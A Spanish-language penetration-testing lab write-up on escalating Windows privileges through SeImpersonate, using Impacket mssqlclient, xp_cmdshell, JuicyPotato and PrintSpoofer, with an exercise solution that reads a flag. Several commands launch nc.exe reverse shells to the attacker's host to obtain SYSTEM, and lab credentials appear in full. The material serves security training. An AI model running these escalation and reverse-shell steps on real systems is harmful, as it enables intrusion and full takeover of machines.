
# SeImpersonate y SeAssignPrimaryToken

En Windows, cada proceso tiene un token que contiene información sobre la cuenta que lo está ejecutando. Estos tokens no se consideran recursos seguros, ya que son solo ubicaciones dentro de la memoria que podrían ser atacadas por la fuerza por usuarios que no pueden leer la memoria. Para utilizar el token, se necesita el privilegio `SeImpersonate`. Solo se otorga a las cuentas administrativas y, en la mayoría de los casos, se puede eliminar durante el fortalecimiento del sistema. Un ejemplo de uso de este token sería [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) .

Los programas legítimos pueden utilizar el token de otro proceso para escalar del administrador al sistema local, que tiene privilegios adicionales. Los procesos generalmente hacen esto llamando al proceso WinLogon para obtener un token del SISTEMA y luego ejecutándose con ese token colocándolo dentro del espacio del SISTEMA. Los atacantes a menudo abusan de este privilegio en los privilegios "estilo patata", donde una cuenta de servicio puede `SeImpersonate`, pero no obtener privilegios completos a nivel de SISTEMA. Básicamente, el ataque Potato engaña a un proceso que se ejecuta como SISTEMA para que se conecte a su proceso, que entrega el token que se utilizará.

Con frecuencia nos encontraremos con este privilegio después de obtener la ejecución remota de código a través de una aplicación que se ejecuta en el contexto de una cuenta de servicio (por ejemplo, al cargar un shell web en una aplicación web ASP.NET, lograr la ejecución remota de código a través de una instalación de Jenkins o al ejecutar comandos a través de consultas MSSQL). Siempre que obtengamos acceso de esta manera, debemos verificar de inmediato este privilegio, ya que su presencia a menudo ofrece una ruta rápida y sencilla a privilegios elevados. Vale la pena leer este [artículo para obtener más detalles sobre los ataques de suplantación de tokens.](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)

***

## <mark style="color:purple;">Ejemplo de SeImpersonate: JuicyPotato</mark>

Tomemos el ejemplo siguiente, en el que hemos logrado establecernos en un servidor SQL mediante un usuario SQL privilegiado. Las conexiones de cliente a IIS y SQL Server pueden configurarse para utilizar la autenticación de Windows. El servidor puede necesitar acceder a otros recursos, como recursos compartidos de archivos, como cliente que se conecta. Esto se puede hacer suplantando al usuario en cuyo contexto se establece la conexión del cliente. Para ello, se le concederá a la cuenta de servicio el privilegio [Suplantar a un cliente después de la autenticación](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) .

En este escenario, la cuenta de servicio SQL Service se ejecuta en el contexto de la cuenta mssqlserver predeterminada. Imagine que hemos logrado la ejecución de comandos con este usuario usando `xp_cmdshell` usando un conjunto de credenciales obtenidas en un archivo `logins.sql` o en un archivo compartido usando la herramienta Snaffler.

### Conexión con MSSQLClient.py&#x20;

Usando las credenciales `sql_dev:Str0ng_P@ssw0rd!`, primero conectemos a la instancia del servidor SQL y confirmemos nuestros privilegios. Podemos hacer esto usando mssqlclient.py del kit de herramientas Impacket.

```shell-session
afsh4ck@kali$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL>
```

### **Habilitar xp\_cmdshell**

A continuación, debemos habilitar el procedimiento `xp_cmdshell` almacenado para ejecutar comandos del sistema operativo. Podemos hacerlo a través del shell MSSSQL de Impacket escribiendo `enable_xp_cmdshell`. Al escribir , `help`se muestran algunas otras opciones de comando.

```shell-session
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

{% hint style="info" %}
Nota: En realidad no tenemos que escribir `RECONFIGURE`, ya que Impacket lo hace por nosotros.
{% endhint %}

### **Confirmando acceso**

Con este acceso, podemos confirmar que efectivamente estamos ejecutándonos en el contexto de una cuenta de servicio de SQL Server.

```shell-session
SQL> xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01
```

### **Privilegios de la cuenta corriente**

A continuación, verifiquemos qué privilegios se le han otorgado a la cuenta de servicio.

```shell-session
SQL> xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
```

El comando `whoami /priv` confirma que [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) está en la lista. Este privilegio se puede utilizar para suplantar una cuenta privilegiada como `NT AUTHORITY\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) se puede utilizar para explotar los privilegios `SeImpersonate` o `SeAssignPrimaryToken` mediante el abuso de DCOM/NTLM.

### **Aumentar privilegios con JuicyPotato**

Para escalar privilegios usando estos derechos, primero descarguemos el binario `JuicyPotato.exe` y carguemos el archivo `nc.exe` al servidor de destino. A continuación, configuremos un receptor Netcat en el puerto 8443 y ejecutemos el comando `-l` donde es el puerto de escucha del servidor COM, `-p` es el programa que se debe iniciar (cmd.exe), `-a` es el argumento que se pasa a cmd.exe y `-t` es la llamada `createprocess`. A continuación, le indicamos a la herramienta que pruebe las funciones [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) y [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) , que necesitan privilegios `SeImpersonate` o `SeAssignPrimaryToken` respectivamente.

```shell-session
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08
```

### **Recibimos una SYSTEM Shell**

Esto se completa con éxito y se recibe un shell `NT AUTHORITY\SYSTEM`.

```bash
afsh4ck@kali$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
nt authority\system


C:\Windows\system32>hostname

hostname
WINLPE-SRV01
```

***

## <mark style="color:purple;">PrintSpoofer y RoguePotato</mark>

JuicyPotato no funciona en Windows Server 2019 ni en Windows 10 build 1809 en adelante. Sin embargo, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) y [RoguePotato](https://github.com/antonioCoco/RoguePotato) se pueden usar para aprovechar los mismos privilegios y obtener `NT AUTHORITY\SYSTEM`acceso de nivel. Esta [publicación del blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) analiza en profundidad la `PrintSpoofer`herramienta, que se puede usar para abusar de los privilegios de suplantación de identidad en los hosts de Windows 10 y Server 2019 donde JuicyPotato ya no funciona.

**Aumento de privilegios mediante PrintSpoofer**

Probemos esto usando la `PrintSpoofer`herramienta. Podemos usar la herramienta para generar un proceso SYSTEM en su consola actual e interactuar con ella, generar un proceso SYSTEM en un escritorio (si está conectado localmente o a través de RDP) o capturar un shell inverso, lo que haremos en nuestro ejemplo. Nuevamente, conéctese `mssqlclient.py`y use la herramienta con el `-c`argumento para ejecutar un comando. Aquí, use `nc.exe`para generar un shell inverso (con un receptor Netcat esperando en nuestro cuadro de ataque en el puerto 8443).

&#x20; SeImpersonate y SeAssignPrimaryToken

```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL 
```

**Captura de Reverse Shell como SISTEMA**

Si todo va según lo previsto, tendremos un shell SYSTEM en nuestro oyente netcat.

&#x20; SeImpersonate y SeAssignPrimaryToken

```shell-session
afsh4ck@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system
```

La escalada de privilegios mediante el uso de apalancamiento `SeImpersonate`es muy común. Es fundamental estar familiarizado con los distintos métodos disponibles según la versión y el nivel del sistema operativo del host de destino.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.43.43 (ACADEMY-WINLPE-SRV01)

Autenticarse en 10.129.43.43 (ACADEMY-WINLPE-SRV01)
- Usuario "sql_dev"
- Contraseña "Str0ng_P@ssw0rd!"
```

### Pregunta 1

> Aumente los privilegios utilizando uno de los métodos que se muestran en esta sección. Envíe el contenido de la flag en C`:\Users\Administrator\Desktop\SeImpersonate\flag.txt`

Vamos a usar JuicyPotato.&#x20;

#### Conexión con Impacket

Primero nos conectamos con MSSqlclient:

```shell-session
afsh4ck@kali$ impacket-mssqlclient sql_dev@10.129.43.43 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands

SQL (WINLPE-SRV01\sql_dev  dbo@master)> 
```

#### Habilitar xp\_cmdshell

```sql
SQL (WINLPE-SRV01\sql_dev  dbo@master)> enable_xp_cmdshell
INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

#### Confirmación

```sql
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell whoami
output                          
-----------------------------   
nt service\mssql$sqlexpress01   

NULL                            
```

#### Ver privilegios  de la cuenta

```
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

PRIVILEGES INFORMATION                                                             
----------------------                                                             

Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled 
```

Observamos el privilegio `SeImpersonatePrivilege` habilitado.

#### Elevación de privilegios con JuicyPotato

Para escalar privilegios usando estos derechos, primero descarguemos el binario `JuicyPotato.exe` y carguemos el archivo `nc.exe` al servidor de destino. A continuación, configuremos un receptor Netcat en el puerto 8443 y ejecutemos el comando `-l` donde es el puerto de escucha del servidor COM, `-p` es el programa que se debe iniciar (cmd.exe), `-a` es el argumento que se pasa a cmd.exe y `-t` es la llamada `createprocess`. A continuación, le indicamos a la herramienta que pruebe las funciones [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) y [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) , que necesitan privilegios `SeImpersonate` o `SeAssignPrimaryToken` respectivamente.

```sql
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.109 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08
```

#### Recibimos Shell SYSTEM

```bash
afsh4ck@kali$ nc -nlvp 8443      
listening on [any] 8443 ...
connect to [10.10.15.109] from (UNKNOWN) [10.129.43.43] 49758
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
whoami
nt authority\system
```

```powershell
C:\Windows\system32> type C:\Users\Administrator\Desktop\SeImpersonate\flag.txt

F**********_p0tato!
```
